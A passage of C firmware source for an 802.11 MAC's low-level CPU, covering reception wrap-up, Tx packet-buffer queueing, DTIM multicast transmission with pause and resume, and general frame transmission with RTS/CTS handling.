						if(time_delta > 0){
							apply_mac_time_delta_usec(time_delta);
							handle_mactime_change(time_delta);																
						}
					break;
				}
			}			
		}


    // Received checksum was bad
    } else {
        // Increment red LEDs
        gl_red_led_index = (gl_red_led_index + 1) % NUM_LEDS;
        userio_write_leds_red(USERIO_BASEADDR, (1<<gl_red_led_index));

        // Check if this packet should be passed up to CPU High for further processing
        rx_filter = wlan_mac_low_get_current_rx_filter();

        switch (rx_filter & RX_FILTER_FCS_MASK) {
            default:
            case RX_FILTER_FCS_GOOD:
                report_to_mac_high = 0;
            break;
            case RX_FILTER_FCS_ALL:
                report_to_mac_high = 1;
            break;
        }
    }

    // Wait for MAC CFG A or B to finish starting a response transmission
    switch(tx_pending_state){
    	case TX_PENDING_NONE:
    		// With the new CPU_LOW beacon structure, it is possible to reach this point in the code
    		// while MAC Support Core A is currently pending on an unrelated MPDU. We should not wait for this
    		// pending state to clear if tx_pending_state is TX_PENDING_NONE because it never will. A previous
    		// version of the code relied on the fact that it was impossible for MAC Support Core A to be pending
    		// At this point
    	break;

        case TX_PENDING_A:

        	do{
				mac_tx_ctrl_status = wlan_mac_get_tx_ctrl_status();

				if(((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_A_STATE_PRE_TX_WAIT) &&
				   ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_POSTRX_TIMER1_RUNNING) == 0)) {
					// This is potentially a bad state. It likely means we were late in processing this reception
					//
					// There is a slight race condition in detecting this state. There is a small 1 or 2 cycle window where this
					// check can inaccurately deem a failed response transmission. As such, we'll require the condition to be met
					// multiple times.
					//
					num_resp_failures++;

					if(num_resp_failures > 2){
						wlan_mac_reset_tx_ctrl_A(1);
						wlan_mac_reset_tx_ctrl_A(0);

						break;
					}
				} else if( (mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_A_STATE_DO_TX ){
					// If the PHY is actively running, we can safely quit this context and get back to frame_transmit to get
					// ready for an ACK reception.
					break;
				}
			} while(mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_PENDING);

        break;

        case TX_PENDING_B:
            do{
				mac_tx_ctrl_status = wlan_mac_get_tx_ctrl_status();

                if( mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_B_DONE ) {
                    if ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_B_RESULT) == WLAN_MAC_TXCTRL_STATUS_TX_B_RESULT_NO_TX) {
                    	// The MAC Support Core B has the capability of successfully not transmitting. This is not relevant
                    	// for ACK transmissions, but it is relevant for CTS transmissions. A CTS will only be sent if the
                    	// NAV is clear at the time of transmission. This code block handles the case the the support core
                    	// elected not to transmit the frame.
                    	//
                        rx_frame_info->flags = rx_frame_info->flags & ~RX_FRAME_INFO_FLAGS_CTRL_RESP_TX;
                        break;
                    }
                    if ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_B_RESULT) == WLAN_MAC_TXCTRL_STATUS_TX_B_RESULT_DID_TX) {
                    	rx_frame_info->flags |= RX_FRAME_INFO_FLAGS_CTRL_RESP_TX;
                        break;
                    }
                } else if(((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_B_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_B_STATE_PRE_TX_WAIT) &&
                          ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_POSTRX_TIMER1_RUNNING) == 0)){

                    // This is potentially a bad state. It likely means we were late in processing this reception
                    //
                    // There is a slight race condition in detecting this state. There is a small 1 or 2 cycle window where this
                    // check can inaccurately deem a failed response transmission. As such, we'll require the condition to be met
                    // multiple times.
                    //
                    num_resp_failures++;

                    if(num_resp_failures > 2){
                    	rx_frame_info->flags = rx_frame_info->flags & ~RX_FRAME_INFO_FLAGS_CTRL_RESP_TX;

                        wlan_mac_reset_tx_ctrl_B(1);
                        wlan_mac_reset_tx_ctrl_B(0);
                        break;
                    }
                }
            } while(mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_B_PENDING);
        break;
    }

    if(rx_frame_info->flags & RX_FRAME_INFO_FLAGS_CTRL_RESP_TX) {
    	rx_frame_info->resp_low_tx_details.tx_start_timestamp_ctrl 		= wlan_mac_low_get_tx_start_timestamp();
    	rx_frame_info->resp_low_tx_details.tx_start_timestamp_frac_ctrl = wlan_mac_low_get_tx_start_timestamp_frac();
    }

    // This packet should be passed up to CPU_high for further processing
    if (report_to_mac_high) {
        // Unlock the pkt buf mutex before passing the packet up
        //     If this fails, something has gone horribly wrong

    	rx_frame_info->rx_pkt_buf_state = RX_PKT_BUF_READY;
        if (unlock_rx_pkt_buf(rx_pkt_buf) != PKT_BUF_MUTEX_SUCCESS) {
            xil_printf("Error: unable to unlock RX pkt_buf %d\n", rx_pkt_buf);
            wlan_mac_low_send_exception(WLAN_ERROR_CODE_CPU_LOW_RX_MUTEX);
        } else {
            wlan_mac_low_frame_ipc_send();

            // Find a free packet buffer and begin receiving packets there (blocks until free buf is found)
            wlan_mac_low_lock_empty_rx_pkt_buf();
        }
    }

    wlan_mac_hw_clear_rx_started();
    return return_value;
}


/*****************************************************************************/
/**
 * @brief Handle a ready message for a Tx packet buffer
 * 
 * When a ready message for a Tx packet buffer is sent from CPU_HIGH, this function
 * saves the packet buffer index into one of two global dl_list structs 
 * (gl_tx_pkt_buf_ready_list_general or gl_tx_pkt_buf_ready_list_dtim_mcast) based
 * upon the pkt_buf_group_t in the tx_frame_info_t for that packet buffer.
 *
 * @param   u8		pkt_buf 	- packet buffer index
 * @return  int 				- 0 for success, -1 for failure 
 */
int handle_tx_pkt_buf_ready(u8 pkt_buf){
	int return_value = 0;
	dl_entry* entry;
	dl_list* list = NULL;
	tx_frame_info_t* tx_frame_info = (tx_frame_info_t*) (TX_PKT_BUF_TO_ADDR(pkt_buf));

	if(gl_tx_pkt_buf_ready_list_free.length > 0){
		entry = gl_tx_pkt_buf_ready_list_free.first;
		dl_entry_remove(&gl_tx_pkt_buf_ready_list_free, entry);

		*((u8*)(entry->data)) = pkt_buf;

		if( (gl_dtim_mcast_buffer_enable == 1) && (gl_beacon_txrx_configure.beacon_tx_mode != NO_BEACON_TX) ){
			switch(tx_frame_info->queue_info.pkt_buf_group){
				case PKT_BUF_GROUP_DTIM_MCAST:
					list = &gl_tx_pkt_buf_ready_list_dtim_mcast;
				break;
				default:
					xil_printf("handle_tx_pkt_buf_ready: unsupported pkt_buf_group_t");
				case PKT_BUF_GROUP_GENERAL:
					list = &gl_tx_pkt_buf_ready_list_general;
				break;
			}
		} else {
			list = &gl_tx_pkt_buf_ready_list_general;
		}

		dl_entry_insertEnd(list, entry);

	} else {
		return_value = -1;
	}

	return return_value;
}

/*****************************************************************************/
/**
 * @brief Poll the packet buffer lists and send
 * 
 * This function attempts to transmit from the head of a specified
 * packet buffer group list.
 *
 * In the case that the packet buffer group argument is PKT_BUF_GROUP_DTIM_MCAST,
 * this function is also responsible for setting the MAC_FRAME_CTRL2_FLAG_MORE_DATA
 * bit in the frame control 2 byte of the outgoing MAC header. It uses the
 * gl_tx_pkt_buf_ready_list_dtim_mcast length to make this determination.
 *
 * Finally, also in the case of PKT_BUF_GROUP_DTIM_MCAST, this function will recognize
 * when frame_transmit_dtim_mcast() terminates without sending the frame (i.e. in
 * the event that a TBTT boundary is crossed before the transmission can begin). In this
 * case, it knows to not remove the packet from the gl_tx_pkt_buf_ready_list_dtim_mcast
 * list and to resume that packet's transmission on the next call to
 * poll_tx_pkt_buf_list(PKT_BUF_GROUP_DTIM_MCAST).
 *
 * @param   pkt_buf_group_t		pkt_buf_group 	- PKT_BUF_GROUP_GENERAL or PKT_BUF_GROUP_DTIM_MCAST
 * @return  int 								- 0 for success, -1 for failure
 */
u32 poll_tx_pkt_buf_list(pkt_buf_group_t pkt_buf_group){
	u8 pkt_buf;
	dl_entry* entry;
	mac_header_80211* header;
	u32 return_value = 0;
	static u8 dtim_mcast_paused = 0;

	switch(pkt_buf_group){
		case PKT_BUF_GROUP_GENERAL:
			if(gl_tx_pkt_buf_ready_list_general.length > 0){
				entry = gl_tx_pkt_buf_ready_list_general.first;
				pkt_buf = *((u8*)(entry->data));

				if( wlan_mac_low_prepare_frame_transmit(pkt_buf) == 0 ){
					frame_transmit_general(pkt_buf);
					wlan_mac_low_finish_frame_transmit(pkt_buf);
				} else {
					xil_printf("Error in wlan_mac_low_prepare_frame_transmit(%d)\n", pkt_buf);
				}

				dl_entry_remove(&gl_tx_pkt_buf_ready_list_general, entry);
				dl_entry_insertEnd(&gl_tx_pkt_buf_ready_list_free, entry);

				//We just removed a packet from the to-be-transmitted list.
				//Now is a good time to see if another one is available in
				//the mailbox to refill it.
				wlan_mac_low_poll_ipc_rx();
			}
		break;
		case PKT_BUF_GROUP_DTIM_MCAST:
			if(gl_tx_pkt_buf_ready_list_dtim_mcast.length > 0){
				entry = gl_tx_pkt_buf_ready_list_dtim_mcast.first;
				pkt_buf = *((u8*)(entry->data));

				// In the special case of sending a DTIM MCAST packet, the DCF is responsible for maintaining the
				// MAC_FRAME_CTRL2_FLAG_MORE_DATA bit in the header.
				header  = (mac_header_80211*)(TX_PKT_BUF_TO_ADDR(pkt_buf) + PHY_TX_PKT_BUF_MPDU_OFFSET);

				if( gl_tx_pkt_buf_ready_list_dtim_mcast.length == 1 ){
					// If there is a second mcast frame in the READY state, we can safely raise
					// the MAC_FRAME_CTRL2_FLAG_MORE_DATA bit. Otherwise, we will be forced to
					// wait until the next DTIM even if another frame enters the READY state while
					// the current frame is underway.
					header->frame_control_2 &= ~MAC_FRAME_CTRL2_FLAG_MORE_DATA;
				} else {
					header->frame_control_2 |= MAC_FRAME_CTRL2_FLAG_MORE_DATA;
					return_value |= POLL_TX_PKT_BUF_LIST_RETURN_MORE_DATA;
				}

				if(dtim_mcast_paused == 0){
					if( wlan_mac_low_prepare_frame_transmit(pkt_buf) != 0 ){
						xil_printf("Error in wlan_mac_low_prepare_frame_transmit(%d) -- PKT_BUF_GROUP_DTIM_MCAST case\n", pkt_buf);
					}
				}

				// Note: we have placed an assumption on gl_tx_pkt_buf_ready_list_dtim_mcast here that,
				// if a DTIM MCAST transmission has been paused, then packet buffer that has been paused
				// is gl_tx_pkt_buf_ready_list_dtim_mcast.first. In other words, gl_tx_pkt_buf_ready_list_dtim_mcast.first
				// may not be modified by any other context.
				if( frame_transmit_dtim_mcast(pkt_buf, dtim_mcast_paused)&DTIM_MCAST_RETURN_PAUSED ){
					dtim_mcast_paused = 1;
					return_value |= POLL_TX_PKT_BUF_LIST_RETURN_PAUSED;
				} else {
					dtim_mcast_paused = 0;


					wlan_mac_low_finish_frame_transmit(pkt_buf);

					return_value |= POLL_TX_PKT_BUF_LIST_RETURN_TRANSMITTED;
					dl_entry_remove(&gl_tx_pkt_buf_ready_list_dtim_mcast, entry);
					dl_entry_insertEnd(&gl_tx_pkt_buf_ready_list_free, entry);

					//We just removed a packet from the to-be-transmitted list.
					//Now is a good time to see if another one is available in
					//the mailbox to refill it.
					wlan_mac_low_poll_ipc_rx();
				}
			}
		break;
		case PKT_BUF_GROUP_OTHER:
			xil_printf("Error in poll_tx_pkt_buf_list: unsupported argument\n");
			return_value |= POLL_TX_PKT_BUF_LIST_RETURN_ERROR;
		break;
	}

	return return_value;
}


/*****************************************************************************/
/**
 * @brief Handles transmission of a DTIM multicast packet
 *
 * This function is called to transmit a multicast packet through Tx Controller D.
 * Prior to the PHY starting the waveform, this function must continually poll the
 * TU target register to determine if a TBTT boundary has been crossed. If so, it
 * must attempt to pause the Tx Controller D and return to the calling context.
 *
 * Additionally, this function is responsible for polling for IPC receptions
 * continually while waiting for the transmission to begin and while the
 * transmission is ongoing.
 *
 * @param   u8		pkt_buf     - Index of the Tx packet buffer containing the packet to transmit
 * @param	u8		resume		- 0 to indicate that this is a new MPDU that must be submitted
 * 								  1 to indicate that this packet should resume a packet already submitted
 * @return  u32					- Bit flags indicating various status messages
 */
u32 frame_transmit_dtim_mcast(u8 pkt_buf, u8 resume) {
	u32 return_value = 0;

	//We will make a few variables static. This will make it so that they retain their
	//values on the next call to frame_transmit_dtim_mcast in the event that resume == 1
    static wlan_mac_low_tx_details_t    low_tx_details;
    static tx_mode_t           			tx_mode;
    static u8							tx_has_started;

    u32 mac_hw_status;
    u32 mac_tx_ctrl_status;

    tx_frame_info_t   * tx_frame_info       = (tx_frame_info_t*) (TX_PKT_BUF_TO_ADDR(pkt_buf));

    if( resume == 0 ){
    	int curr_tx_pow;
        u16                 n_slots             = 0;
        u16                 n_slots_readback    = 0;
        u8                  mpdu_tx_ant_mask    = 0;

    	// Extract waveform params from the tx_frame_info
		u8  mcs      = tx_frame_info->params.phy.mcs;
		u8  phy_mode = (tx_frame_info->params.phy.phy_mode & (PHY_MODE_HTMF | PHY_MODE_NONHT));
		u16 length   = tx_frame_info->length;

		tx_frame_info->num_tx_attempts   = 0;
		tx_frame_info->phy_samp_rate	  = (u8)wlan_mac_low_get_phy_samp_rate();

		// Compare the length of this frame to the RTS Threshold
		// TODO: needs further investigation
		if(length <= gl_dot11RTSThreshold) {
			tx_mode = TX_MODE_SHORT;
		} else {
			tx_mode = TX_MODE_LONG;
		}

		tx_has_started = 0;
		(tx_frame_info->num_tx_attempts)++;

		// Write the SIGNAL field (interpreted by the PHY during Tx waveform generation)
		// This is the SIGNAL field for the MPDU we will eventually transmit. It's possible
		// the next waveform we send will be an RTS with its own independent SIGNAL

		write_phy_preamble(pkt_buf, phy_mode, mcs, length);

		// Configure the Tx antenna selection
		mpdu_tx_ant_mask    = 0;

		switch(tx_frame_info->params.phy.antenna_mode) {
			case TX_ANTMODE_SISO_ANTA:  mpdu_tx_ant_mask |= 0x1;  break;
			case TX_ANTMODE_SISO_ANTB:  mpdu_tx_ant_mask |= 0x2;  break;
			case TX_ANTMODE_SISO_ANTC:  mpdu_tx_ant_mask |= 0x4;  break;
			case TX_ANTMODE_SISO_ANTD:  mpdu_tx_ant_mask |= 0x8;  break;
			default:                    mpdu_tx_ant_mask  = 0x1;  break;       // Default to RF_A
		}

		// Configure the Tx power - update all antennas, even though only one will be used
		curr_tx_pow = wlan_mac_low_dbm_to_gain_target(tx_frame_info->params.phy.power);
		wlan_mac_tx_ctrl_D_gains(curr_tx_pow, curr_tx_pow, curr_tx_pow, curr_tx_pow);

		// We speculatively draw a backoff in case the backoff counter is currently 0 but
		//  the medium is busy.
		n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);

		// Configure the Tx state machine for this transmission
		// wlan_mac_tx_ctrl_D_params(pktBuf, antMask, req_backoff, phy_mode, num_slots)
		wlan_mac_tx_ctrl_D_params(pkt_buf, mpdu_tx_ant_mask, 0, phy_mode, n_slots);

		// Wait for the Tx PHY to be idle
		// Actually waiting here is rare, but handles corner cases like a background ACK transmission at a low rate
		// overlapping the attempt to start a new packet transmission
		do{
			mac_hw_status = wlan_mac_get_status();
		} while(mac_hw_status & WLAN_MAC_STATUS_MASK_TX_PHY_ACTIVE);

		// Submit the MPDU for transmission - this starts the MAC hardware's MPDU Tx state machine
		wlan_mac_tx_ctrl_D_start(1);
		wlan_mac_tx_ctrl_D_start(0);

		// Immediately re-read the current slot count.
		n_slots_readback = wlan_mac_get_backoff_count_D();

		if( (n_slots != n_slots_readback) ){
			// For the first transmission (non-retry) of an MPDU, the number of
			// slots used by the backoff process is ambiguous. The n_slots we provided
			// to wlan_mac_tx_ctrl_A_params is only a suggestion. If the medium has been
			// idle for a DIFS, then there will not be a backoff. Or, if another backoff is
			// currently running, the MAC Config Core A will inherit that backoff. By
			// immediately reading back the slot count after starting the core, we can
			// overwrite the number of slots that we will fill into low_tx_details with
			// the correct value
			n_slots = n_slots_readback;
		}


		low_tx_details.flags						= 0;
		low_tx_details.phy_params_mpdu.mcs          = tx_frame_info->params.phy.mcs;
		low_tx_details.phy_params_mpdu.phy_mode     = tx_frame_info->params.phy.phy_mode;
		low_tx_details.phy_params_mpdu.power        = tx_frame_info->params.phy.power;
		low_tx_details.phy_params_mpdu.antenna_mode = tx_frame_info->params.phy.antenna_mode;

		// If RTS/CTS isn't used, these fields should just be ignored
		low_tx_details.phy_params_ctrl.power        = tx_frame_info->params.phy.power;
		low_tx_details.phy_params_ctrl.antenna_mode = tx_frame_info->params.phy.antenna_mode;

		low_tx_details.chan_num    = wlan_mac_low_get_active_channel();
		low_tx_details.cw          = (1 << gl_cw_exp)-1; //(2^(gl_cw_exp) - 1)
		low_tx_details.ssrc        = gl_stationShortRetryCount;
		low_tx_details.slrc        = gl_stationLongRetryCount;
		low_tx_details.src         = 0;
		low_tx_details.lrc         = 0;

		// NOTE: the pre-Tx backoff may not occur for the initial transmission attempt. If the medium has been idle for >DIFS when
		// the first Tx occurs the DCF state machine will not start a backoff. The upper-level MAC should compare the num_slots value
		// to the time delta between the accept and start times of the first transmission to determine whether the pre-Tx backoff
		// actually occurred.
		low_tx_details.num_slots   	  = n_slots;
		low_tx_details.attempt_number = tx_frame_info->num_tx_attempts;

    } else {
    	// There is currently a transmission that whose state is "paused." We should
    	// resume it without resubmitting it to the core.

    	wlan_mac_pause_tx_ctrl_D(0);
    } //if( resume == 0 )


	// Wait for the MPDU Tx to finish
	do { // while(tx_status & WLAN_MAC_STATUS_MASK_TX_D_PENDING)

		// Poll the DCF core status register
		mac_hw_status = wlan_mac_get_status();

		// Fill in the timestamp if indicated by the flags, only possible after Tx PHY has started
		if ( (mac_hw_status & WLAN_MAC_STATUS_MASK_TX_PHY_ACTIVE) && (tx_has_started == 0)) {

			tx_has_started = 1;
			low_tx_details.tx_details_type  = TX_DETAILS_MPDU;
			low_tx_details.tx_start_timestamp_mpdu = wlan_mac_low_get_tx_start_timestamp();
			low_tx_details.tx_start_timestamp_frac_mpdu = wlan_mac_low_get_tx_start_timestamp_frac();

		}



		// Transmission is complete
		if( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_D_DONE ) {
			tx_mode = TX_MODE_SHORT;

			switch(tx_mode) {
				case TX_MODE_SHORT:
					reset_ssrc();
					reset_cw();
				break;
				case TX_MODE_LONG:
					reset_slrc();
					reset_cw();
				break;
			}

			// Start a post-Tx backoff using the updated contention window
			// TODO: Debate merit of software-initiated backoffs in D

			//n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
			//wlan_mac_dcf_hw_start_backoff(n_slots);

			// Send IPC message containing the details about this low-level transmission
			wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);
			tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_SUCCESS;
			return return_value;
		} else {
			//  This is the same MAC status check performed in the framework wlan_mac_low_poll_frame_rx()
			//  It is critical to check the Rx status here using the same status register read that was
			//  used in the Tx state checking above. Skipping this and calling wlan_mac_low_poll_frame_rx()
			//  directly leads to a race between the Tx status checking above and Rx status checking
			if (mac_hw_status & WLAN_MAC_STATUS_MASK_RX_PHY_STARTED) {
				wlan_mac_low_poll_frame_rx();
			} else {
				if (wlan_mac_check_tu_latch() && (tx_has_started == 0)){
					wlan_mac_pause_tx_ctrl_D(1);
					mac_tx_ctrl_status = wlan_mac_get_tx_ctrl_status();
					// Check if Tx controller D is deferring (now with a paused backoff) or idle (no Tx pending)
					// if we lost the race to pause the controller, we will continue on as if we did not observe the TU latch
					if(((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_D_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_D_STATE_DEFER) ||
					   ((mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_D_STATE) == WLAN_MAC_TXCTRL_STATUS_TX_D_STATE_IDLE)) {
						return_value |= DTIM_MCAST_RETURN_PAUSED;
						return return_value;
					} else {
						wlan_mac_pause_tx_ctrl_D(0);
					}
				} else {
					// Poll IPC rx
					// TODO: Need to handle implications of an IPC message changing something like channel
					wlan_mac_low_poll_ipc_rx();
				}
			}
		} // END if(Tx D state machine done)
	} while( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_D_PENDING );

    return return_value;

}

/*****************************************************************************/
/**
 * @brief Handles transmission of a general packet
 *
 * This function is responsible for using Tx Controller A to send a new MPDU and handle
 * any retries that the MPDU may require.
 *
 * @param   pkt_buf     - Index of the Tx packet buffer containing the packet to transmit
 * @return  none
 */
void frame_transmit_general(u8 pkt_buf) {
    u8  mac_cfg_mcs;
    u16 mac_cfg_length;
    u8  mac_cfg_pkt_buf;
    u8	ack_phy_mode;
    u8	ack_mcs;

    u16 rts_header_duration;
    u16 cts_header_duration;
    wlan_mac_low_tx_details_t   low_tx_details;

    u8 req_timeout;

    u32 rx_status;
    u32 mac_hw_status;
    u32 mac_tx_ctrl_status;

    int curr_tx_pow;

    u8	tx_has_started;

    tx_wait_state_t     		tx_wait_state;
    tx_mode_t           		tx_mode;


    u16					short_retry_count	= 0;
    u16					long_retry_count	= 0;
    u16                 n_slots             = 0;
    u16                 n_slots_readback    = 0;
    u8                  mpdu_tx_ant_mask    = 0;
    tx_frame_info_t   * tx_frame_info       = (tx_frame_info_t*) (TX_PKT_BUF_TO_ADDR(pkt_buf));
    mac_header_80211  * header              = (mac_header_80211*)(TX_PKT_BUF_TO_ADDR(pkt_buf) + PHY_TX_PKT_BUF_MPDU_OFFSET);

    // Extract waveform params from the tx_frame_info
    u8  mcs      = tx_frame_info->params.phy.mcs;
    u8  phy_mode = (tx_frame_info->params.phy.phy_mode & (PHY_MODE_HTMF | PHY_MODE_NONHT));
    u16 length   = tx_frame_info->length;

    // This state variable will inform the rest of the frame_transmit function
    // on whether the code is actively waiting for an ACK, for an RTS, or not
    // waiting for anything.
    tx_wait_state = TX_WAIT_NONE;

    tx_frame_info->num_tx_attempts   = 0;
    tx_frame_info->phy_samp_rate	  = (u8)wlan_mac_low_get_phy_samp_rate();

	// Compare the length of this frame to the RTS Threshold
	if(length <= gl_dot11RTSThreshold) {
		tx_mode = TX_MODE_SHORT;
	} else {
		tx_mode = TX_MODE_LONG;
	}

	if((tx_frame_info->flags) & TX_FRAME_INFO_FLAGS_FILL_DURATION){
		// ACK_N_DBPS is used to calculate duration of the ACK waveform which might be received in response to this transmission
		//  The ACK duration is used to calculate the DURATION field in the MAC header
		//  The selection of ACK rate for a given DATA rate is specified in IEEE 802.11-2012 9.7.6.5.2
		ack_mcs = wlan_mac_low_mcs_to_ctrl_resp_mcs(tx_frame_info->params.phy.mcs, tx_frame_info->params.phy.phy_mode);
		ack_phy_mode = PHY_MODE_HTMF;

		// Compute and fill in the duration of any time-on-air following this packet's transmission
		//     For DATA Tx, DURATION = T_SIFS + T_ACK, where T_ACK is function of the ACK Tx rate
		header->duration_id = wlan_ofdm_calc_txtime(sizeof(mac_header_80211_ACK) + WLAN_PHY_FCS_NBYTES, ack_mcs, ack_phy_mode, wlan_mac_low_get_phy_samp_rate()) + gl_mac_timing_values.t_sifs;
	}


	// Retry loop
	while(1) {
		tx_has_started = 0;

		(tx_frame_info->num_tx_attempts)++;

		// Check if the higher-layer MAC requires this transmission have a post-Tx timeout
		req_timeout = ((tx_frame_info->flags) & TX_FRAME_INFO_FLAGS_REQ_TO) != 0;

		// Write the SIGNAL field (interpreted by the PHY during Tx waveform generation)
		// This is the SIGNAL field for the MPDU we will eventually transmit. It's possible
		// the next waveform we send will be an RTS with its own independent SIGNAL

		//wlan_phy_set_tx_signal(mpdu_pkt_buf, mpdu_rate, mpdu_length);
		write_phy_preamble(pkt_buf, phy_mode, mcs, length);


		if ((tx_mode == TX_MODE_LONG) && (req_timeout == 1)) {
			// This is a long MPDU that requires an RTS/CTS handshake prior to the MPDU transmission.
			tx_wait_state   = TX_WAIT_CTS;

			// This is a global pkt_buf index that can be seen by the frame_receive() context.
			// frame_receive() needs this to figure out what to send in the event that it receives
			// a valid CTS.
			gl_long_mpdu_pkt_buf = pkt_buf;

			mac_cfg_pkt_buf = TX_PKT_BUF_RTS;

			// The rate given to us in the argument of frame_transmit applies to the MPDU. Several
			// elements depend on this rate:
			//
			// 1) The rate of the RTS we will send (fixed NONHT phy mode for CTRL response)
			// 2) The rate of the CTS we expect to receive (fixed NONHT phy mode for CTRL response)
			// 3) The duration of the RTS/CTS/DATA frames a long with the IFS periods between them
			//
			// The below switch() sets these elements accordingly.
			//
			switch (mcs) {
				default:
				case 0:
					mac_cfg_mcs         = 0;
					cts_header_duration = TX_TIME_CTS_R6;
					low_tx_details.phy_params_ctrl.mcs = 0;
				break;
				case 1:
					mac_cfg_mcs         = 0;
					cts_header_duration = TX_TIME_CTS_R6;
					low_tx_details.phy_params_ctrl.mcs = 0;
				break;
				case 2:
					mac_cfg_mcs         = 2;
					cts_header_duration = TX_TIME_CTS_R12;
					low_tx_details.phy_params_ctrl.mcs = 2;
				break;
				case 3:
					mac_cfg_mcs         = 2;
					cts_header_duration = TX_TIME_CTS_R12;
					low_tx_details.phy_params_ctrl.mcs = 2;
				break;
				case 4:
					mac_cfg_mcs         = 4;
					cts_header_duration = TX_TIME_CTS_R24;
					low_tx_details.phy_params_ctrl.mcs = 4;
				break;
				case 5:
					mac_cfg_mcs         = 4;
					cts_header_duration = TX_TIME_CTS_R24;
					low_tx_details.phy_params_ctrl.mcs = 4;
				break;
				case 6:
					mac_cfg_mcs         = 4;
					cts_header_duration = TX_TIME_CTS_R24;
					low_tx_details.phy_params_ctrl.mcs = 4;
				break;
				case 7:
					mac_cfg_mcs         = 4;
					cts_header_duration = TX_TIME_CTS_R24;
					low_tx_details.phy_params_ctrl.mcs = 4;
				break;
			}

			rts_header_duration = (gl_mac_timing_values.t_sifs) + cts_header_duration +
								  (gl_mac_timing_values.t_sifs) + wlan_ofdm_calc_txtime(length, tx_frame_info->params.phy.mcs, tx_frame_info->params.phy.phy_mode, wlan_mac_low_get_phy_samp_rate()) +
								  header->duration_id;

			// We let "duration" be equal to the duration field of an RTS. This value is provided explicitly to CPU_HIGH
			// in the low_tx_details struct such that CPU_HIGH has can reconstruct the RTS in its log. This isn't critical
			// to the operation of the DCF, but is critical for the logging framework.
			low_tx_details.duration = rts_header_duration;

			// Construct the RTS frame in the dedicated Tx pkt buf for control frames
			mac_cfg_length = wlan_create_rts_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_RTS) + PHY_TX_PKT_BUF_MPDU_OFFSET),
												   header->address_1,
												   header->address_2,
												   rts_header_duration);

			// Write SIGNAL for RTS
			//wlan_phy_set_tx_signal(mac_cfg_pkt_buf, mac_cfg_rate, mac_cfg_length);
			write_phy_preamble(mac_cfg_pkt_buf, PHY_MODE_NONHT, mac_cfg_mcs, mac_cfg_length);

		} else if((tx_mode == TX_MODE_SHORT) && (req_timeout == 1)) {
			// Unicast, no RTS
			tx_wait_state   = TX_WAIT_ACK;
			mac_cfg_mcs     = mcs;
			mac_cfg_length  = length;
			mac_cfg_pkt_buf = pkt_buf;
		} else {
			// Multicast, short or long
			tx_wait_state   = TX_WAIT_NONE;
			mac_cfg_mcs     = mcs;
			mac_cfg_length  = length;
			mac_cfg_pkt_buf = pkt_buf;
		}

		// Configure the Tx antenna selection
		mpdu_tx_ant_mask    = 0;

		switch(tx_frame_info->params.phy.antenna_mode) {
			case TX_ANTMODE_SISO_ANTA:  mpdu_tx_ant_mask |= 0x1;  break;
			case TX_ANTMODE_SISO_ANTB:  mpdu_tx_ant_mask |= 0x2;  break;
			case TX_ANTMODE_SISO_ANTC:  mpdu_tx_ant_mask |= 0x4;  break;
			case TX_ANTMODE_SISO_ANTD:  mpdu_tx_ant_mask |= 0x8;  break;
			default:                    mpdu_tx_ant_mask  = 0x1;  break;       // Default to RF_A
		}

		// Configure the Tx power - update all antennas, even though only one will be used
		curr_tx_pow = wlan_mac_low_dbm_to_gain_target(tx_frame_info->params.phy.power);
		wlan_mac_tx_ctrl_A_gains(curr_tx_pow, curr_tx_pow, curr_tx_pow, curr_tx_pow);

		if ((tx_frame_info->num_tx_attempts) == 1) {
			// This is the first transmission, so we speculatively draw a backoff in case
			// the backoff counter is currently 0 but the medium is busy. Prior to all other
			// (re)transmissions, an explicit backoff will have been started at the end of
			// the previous iteration of this loop.
			//
			n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);



			// Configure the DCF core Tx state machine for this transmission
			// wlan_mac_tx_ctrl_A_params(pktBuf, antMask, preTx_backoff_slots, preWait_postRxTimer1, preWait_postTxTimer1, postWait_postTxTimer2, phy_mode)
			wlan_mac_tx_ctrl_A_params(mac_cfg_pkt_buf, mpdu_tx_ant_mask, n_slots, 0, 0, req_timeout, phy_mode);

		} else {
			// This is a retry. We will inherit whatever backoff that is currently running.
			// Configure the DCF core Tx state machine for this transmission
			// preTx_backoff_slots is 0 here, since the core will have started a post-timeout backoff automatically
			wlan_mac_tx_ctrl_A_params(mac_cfg_pkt_buf, mpdu_tx_ant_mask, 0, 0, 0, req_timeout, phy_mode);
		}

		// Wait for the Tx PHY to be idle
		// Actually waiting here is rare, but handles corner cases like a background ACK transmission at a low rate
		// overlapping the attempt to start a new packet transmission
		do{
			mac_hw_status = wlan_mac_get_status();
		} while(mac_hw_status & WLAN_MAC_STATUS_MASK_TX_PHY_ACTIVE);

		// Submit the MPDU for transmission - this starts the MAC hardware's MPDU Tx state machine
		wlan_mac_tx_ctrl_A_start(1);
		wlan_mac_tx_ctrl_A_start(0);

		// Immediately re-read the current slot count.
		n_slots_readback = wlan_mac_get_backoff_count_A();

		// While waiting, fill in the metadata about this transmission attempt, to be used by CPU High in creating TX_LOW log entries
